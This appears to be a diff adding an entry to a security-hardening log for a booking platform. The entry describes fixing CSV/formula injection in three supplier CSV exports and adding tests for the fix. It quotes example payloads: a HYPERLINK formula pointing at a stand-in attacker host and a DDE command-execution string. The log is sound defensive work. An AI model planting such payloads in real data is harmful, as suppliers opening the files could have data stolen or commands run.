@@ -2567,6 +2567,45 @@ without revisiting the policy" pattern could exist elsewhere).
 
 Continuing to the next hypothesis.
 
+### Phase 591 -- Fixed CSV/formula injection across all three supplier CSV exports (Bookings, Pickup Planner, Earnings)
+
+Found while sweeping for fresh, unaudited surface after the Phase 590 RLS
+sweep wound down: three supplier-portal export functions
+(downloadBookingsCsv, Pickup Planner's exportCsv, Earnings' money export)
+each hand-rolled their own local escape helper, and all three only
+guarded ordinary CSV syntax (quote/comma/newline) -- none defended
+against CSV/formula injection (CWE-1236). Every export includes at least
+guest_name, a field any TRAVELER sets freely at an ordinary,
+unauthenticated checkout. A guest name or special request like
+`=HYPERLINK("https://evil.example/steal","Open")` or a DDE payload
+(`=cmd|'/c calc'!A0`) reaches the exported CSV verbatim and gets
+evaluated by Excel/Sheets/LibreOffice as a formula the moment a supplier
+opens their own export -- quoting the CSV field doesn't prevent this,
+since quoting is a CSV-parsing concern and formula evaluation is a
+separate, later step the spreadsheet app does on the parsed cell content.
+
+Fixed at the shared-utility layer (src/lib/csv-export.ts, csvSafeCell)
+rather than patching each duplicated escape function separately -- the
+standard OWASP mitigation (prefix a leading `'` when a cell's first
+character is =, +, -, @, tab, or CR; every mainstream spreadsheet app
+renders that as an invisible "force text" marker). All three call sites
+switched to the shared function; existing CSV-syntax escaping behavior
+is unchanged, so this is a pure hardening with no business-rule or
+exported-data change.
+
+7-case Vitest suite: keeps the three legacy escape functions inline
+(never imported by app code) to prove they let real formula/DDE payloads
+through with the trigger character still leading the cell (GAP
+CONFIRMED), then proves the fix neutralizes every payload, preserves
+existing quote/comma/newline escaping, doesn't corrupt a legitimate
+value that happens to start with a trigger character, and doesn't
+double-escape when a value needs both protections.
+
+Verified: tsc clean, vitest 100 files / 588 tests (7 new), no
+regressions.
+
+Continuing to the next hypothesis.
+
 ## Known remaining risks (ranked)
 
 1. **P1 — Traveler browser golden journeys**: verified live (Phase 547) —
